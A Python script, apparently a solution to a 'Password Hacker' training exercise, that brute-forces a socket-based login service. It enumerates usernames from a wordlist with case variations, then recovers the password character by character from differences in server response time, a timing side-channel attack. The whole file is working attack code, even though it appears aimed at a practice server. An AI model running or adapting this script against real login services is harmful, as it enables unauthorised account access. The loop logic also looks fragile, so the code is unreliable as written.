import itertools
import json
import socket
import string
import sys
import time

args = sys.argv
ip = args[1]
port = int(args[2])
client = socket.socket()
client.connect((ip, port))
f = open(r'D:\Password Hacker\Password Hacker\task\hacking\logins.txt')

pw = []
for i in string.ascii_lowercase:
    pw.append(i)
    pw.append(i.upper())
for i in range(10):
    pw.append(str(i))

flag = True
lg = False
password = ' '
dict_password = {}
while flag:
    n = 0
    name = f.readline().strip('\n')
    dict_password['password'] = password
    for login in list(
            map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in name)))):
        if not lg:
            dict_password['login'] = login
        client.send(json.dumps(dict_password).encode())
        start = time.perf_counter()
        response = json.loads(client.recv(1024).decode())
        end = time.perf_counter()
        last = end - start
        if response["result"] == "Wrong login!":
            # 用户名错误，尝试下一个
            continue
        elif response["result"] == "Wrong password!" and last <= 0.1:
            # 用户名正确,且最后一位密码不正确
            lg = True
            password = password[0:len(password) - 1]
            password += pw[n]
            dict_password['password'] = password
            n += 1

        elif response["result"] == "Wrong password!" and last > 0.1:
            # 找到密码的前一位，继续破解密码的后续部分
            n = 0
            password += pw[n]
            dict_password['password'] = password

        elif response["result"] == "Connection success!":
            # 得到正确的用户名和密码，退出
            flag = False
            break

print(json.dumps(dict_password, indent=4))
client.close()
f.close()
